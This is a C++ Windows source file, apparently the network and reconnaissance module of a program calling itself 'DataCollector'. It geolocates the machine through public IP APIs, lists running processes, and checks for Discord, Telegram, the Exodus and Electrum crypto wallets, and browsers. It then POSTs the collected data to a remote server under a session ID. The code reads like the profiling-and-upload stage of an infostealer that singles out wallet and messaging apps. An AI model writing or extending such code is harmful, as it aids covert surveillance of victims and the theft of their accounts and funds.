#include "network.h"
#include "nlohmann/json.hpp"
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <fstream>
#include <string>
#include <vector>
#include <optional>
#include <map>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "psapi.lib")

using json = nlohmann::json;

bool send_chunk(const std::string& serverUrl, const std::string& sessionId, const PcData& pcData) {
    HINTERNET hSession = nullptr;
    HINTERNET hConnect = nullptr;
    HINTERNET hRequest = nullptr;
    
    try {
        // Convert PcData to JSON
        json jsonBody = pcData.to_json();
        std::string jsonString = jsonBody.dump();

        // Initialize WinHTTP with timeouts
        hSession = WinHttpOpen(L"DataCollector/1.0",
                               WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                               WINHTTP_NO_PROXY_NAME,
                               WINHTTP_NO_PROXY_BYPASS,
                               0);
        if (!hSession) {
            return false;
        }

        // Set session timeouts (resolve, connect, send, receive)
        DWORD sessionTimeout = 30000; // 30 seconds
        WinHttpSetTimeouts(hSession, sessionTimeout, sessionTimeout, sessionTimeout, sessionTimeout);

        // Parse URL
        URL_COMPONENTSW urlComp = { sizeof(URL_COMPONENTSW) };
        urlComp.dwSchemeLength = -1;
        urlComp.dwHostNameLength = -1;
        urlComp.dwUrlPathLength = -1;
        urlComp.dwExtraInfoLength = -1;

        std::wstring wideUrl(serverUrl.begin(), serverUrl.end());
        if (!WinHttpCrackUrl(wideUrl.c_str(), 0, 0, &urlComp)) {
            WinHttpCloseHandle(hSession);
            return false;
        }

        std::wstring hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
        std::wstring urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

        // Connect to server
        hConnect = WinHttpConnect(hSession, hostName.c_str(),
                                  urlComp.nPort, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return false;
        }

        // Create request
        hRequest = WinHttpOpenRequest(hConnect, L"POST", urlPath.c_str(),
                                     nullptr, WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES,
                                     urlComp.nScheme == INTERNET_SCHEME_HTTPS ?
                                     WINHTTP_FLAG_SECURE : 0);
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        // Set request timeouts (resolve, connect, send, receive)
        DWORD requestTimeout = 30000; // 30 seconds
        WinHttpSetTimeouts(hRequest, requestTimeout, requestTimeout, requestTimeout, requestTimeout);

        // Set headers
        std::wstring sessionHeader = L"X-Session-Id: " + std::wstring(sessionId.begin(), sessionId.end());
        WinHttpAddRequestHeaders(hRequest, sessionHeader.c_str(), -1,
                               WINHTTP_ADDREQ_FLAG_ADD);
        WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/json", -1,
                               WINHTTP_ADDREQ_FLAG_ADD);

        // Send request
        BOOL bResult = WinHttpSendRequest(hRequest,
                                        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                        const_cast<char*>(jsonString.c_str()),
                                        static_cast<DWORD>(jsonString.length()),
                                        static_cast<DWORD>(jsonString.length()),
                                        0);
        if (!bResult) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        // Receive response
        bResult = WinHttpReceiveResponse(hRequest, nullptr);
        if (bResult) {
            DWORD dwStatusCode = 0;
            DWORD dwSize = sizeof(dwStatusCode);
            WinHttpQueryHeaders(hRequest,
                              WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                              nullptr, &dwStatusCode, &dwSize, nullptr);

            // Check if status code is 2xx (success)
            bResult = (dwStatusCode >= 200 && dwStatusCode < 300);
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return bResult != FALSE;

    } catch (const std::exception&) {
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);
        return false;
    }
}

std::optional<LocationInfo> fetch_location() {
    std::vector<std::string> locationApis = {
        "https://ipapi.co/json/",
        "https://ip-api.com/json/",
        "https://freeipapi.com/api/json"
    };

    for (const auto& apiUrl : locationApis) {
        try {
            // Initialize WinHTTP for location request
            HINTERNET hSession = WinHttpOpen(L"DataCollector/1.0",
                                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                           WINHTTP_NO_PROXY_NAME,
                                           WINHTTP_NO_PROXY_BYPASS,
                                           0);
            if (!hSession) continue;

            // Parse URL
            URL_COMPONENTSW urlComp = { sizeof(URL_COMPONENTSW) };
            urlComp.dwSchemeLength = -1;
            urlComp.dwHostNameLength = -1;
            urlComp.dwUrlPathLength = -1;
            urlComp.dwExtraInfoLength = -1;

            std::wstring wideUrl(apiUrl.begin(), apiUrl.end());
            if (!WinHttpCrackUrl(wideUrl.c_str(), 0, 0, &urlComp)) {
                WinHttpCloseHandle(hSession);
                continue;
            }

            std::wstring hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
            std::wstring urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

            // Connect to server
            HINTERNET hConnect = WinHttpConnect(hSession, hostName.c_str(),
                                              urlComp.nPort, 0);
            if (!hConnect) {
                WinHttpCloseHandle(hSession);
                continue;
            }

            // Create request
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlPath.c_str(),
                                                   nullptr, WINHTTP_NO_REFERER,
                                                   WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                   urlComp.nScheme == INTERNET_SCHEME_HTTPS ?
                                                   WINHTTP_FLAG_SECURE : 0);
            if (!hRequest) {
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                continue;
            }

            // Set timeout
            DWORD timeout = 10000; // 10 seconds
            WinHttpSetTimeouts(hRequest, timeout, timeout, timeout, timeout);

            // Send request
            if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                  WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                continue;
            }

            // Receive response
            if (!WinHttpReceiveResponse(hRequest, nullptr)) {
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                continue;
            }

            // Check status code
            DWORD dwStatusCode = 0;
            DWORD dwSize = sizeof(dwStatusCode);
            WinHttpQueryHeaders(hRequest,
                              WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                              nullptr, &dwStatusCode, &dwSize, nullptr);

            if (dwStatusCode != 200) {
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                continue;
            }

            // Read response data
            std::string responseBody;
            DWORD dwDownloaded = 0;
            char buffer[4096];

            do {
                if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &dwDownloaded)) {
                    break;
                }
                if (dwDownloaded > 0) {
                    responseBody.append(buffer, dwDownloaded);
                }
            } while (dwDownloaded > 0);

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);

            // Trim whitespace
            responseBody.erase(responseBody.begin(),
                             std::find_if(responseBody.begin(), responseBody.end(),
                                         [](unsigned char ch) { return !std::isspace(ch); }));
            responseBody.erase(std::find_if(responseBody.rbegin(), responseBody.rend(),
                                          [](unsigned char ch) { return !std::isspace(ch); }).base(),
                             responseBody.end());

            // Check if response starts with '{'
            if (responseBody.empty() || responseBody[0] != '{') {
                continue;
            }

            // Parse JSON based on API format
            try {
                json responseJson = json::parse(responseBody);
                LocationInfo location;

                if (apiUrl.find("ipapi.co") != std::string::npos) {
                    // ipapi.co format
                    location.countryName = responseJson.value("country_name", "Unknown");
                    location.cityName = responseJson.value("city", "Unknown");
                    location.latitude = responseJson.value("latitude", 0.0);
                    location.longitude = responseJson.value("longitude", 0.0);
                    location.ipAddress = responseJson.value("ip", "127.0.0.1");
                } else if (apiUrl.find("ip-api.com") != std::string::npos) {
                    // ip-api.com format
                    location.countryName = responseJson.value("country", "Unknown");
                    location.cityName = responseJson.value("city", "Unknown");
                    location.latitude = responseJson.value("lat", 0.0);
                    location.longitude = responseJson.value("lon", 0.0);
                    location.ipAddress = responseJson.value("query", "127.0.0.1");
                } else {
                    // freeipapi.com format
                    location.countryName = responseJson.value("countryName", "Unknown");
                    location.cityName = responseJson.value("cityName", "Unknown");
                    location.latitude = responseJson.value("latitude", 0.0);
                    location.longitude = responseJson.value("longitude", 0.0);
                    location.ipAddress = responseJson.value("ipAddress", "127.0.0.1");
                }

                return location;

            } catch (const std::exception&) {
                continue;
            }

        } catch (const std::exception&) {
            continue;
        }
    }

    return std::nullopt;
}

std::vector<RunningProcess> get_running_processes() {
    std::vector<RunningProcess> processes;

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return processes;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hProcessSnap, &pe32)) {
        do {
            // Open process to get more information
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                // Get memory usage
                PROCESS_MEMORY_COUNTERS pmc;
                if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
                    std::string memUsage = std::to_string(pmc.WorkingSetSize / 1024) + " KB";
                    std::string imageName = pe32.szExeFile;
                    std::string pid = std::to_string(pe32.th32ProcessID);
                    std::string sessionName = std::to_string(pe32.th32DefaultHeapID); // Using heap ID as session proxy
                    std::string sessionNum = std::to_string(pe32.pcPriClassBase); // Using priority class as session num proxy

                    processes.push_back({
                        imageName, pid, sessionName, sessionNum, memUsage
                    });
                }
                CloseHandle(hProcess);
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return processes;
}

std::vector<InstalledApp> get_installed_apps() {
    std::vector<InstalledApp> apps;

    // Get username for path replacement
    char username[256];
    DWORD usernameLen = sizeof(username);
    GetUserNameA(username, &usernameLen);

    std::map<std::string, std::string> appsToFind = {
        {"Discord", "C:\\Users\\" + std::string(username) + "\\AppData\\Local\\Discord\\Update.exe"},
        {"Telegram", "C:\\Users\\" + std::string(username) + "\\AppData\\Roaming\\Telegram Desktop\\Telegram.exe"},
        {"Exodus", "C:\\Users\\" + std::string(username) + "\\AppData\\Local\\exodus\\Exodus.exe"},
        {"Electrum", "C:\\Program Files (x86)\\Electrum\\electrum.exe"},
        {"Google Chrome", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
        {"Mozilla Firefox", "C:\\Program Files\\Mozilla Firefox\\firefox.exe"},
        {"Visual Studio Code", "C:\\Users\\" + std::string(username) + "\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
    };

    for (const auto& [appName, path] : appsToFind) {
        std::ifstream file(path);
        bool found = file.good();
        file.close();
        apps.push_back({appName, found});
    }

    return apps;
}
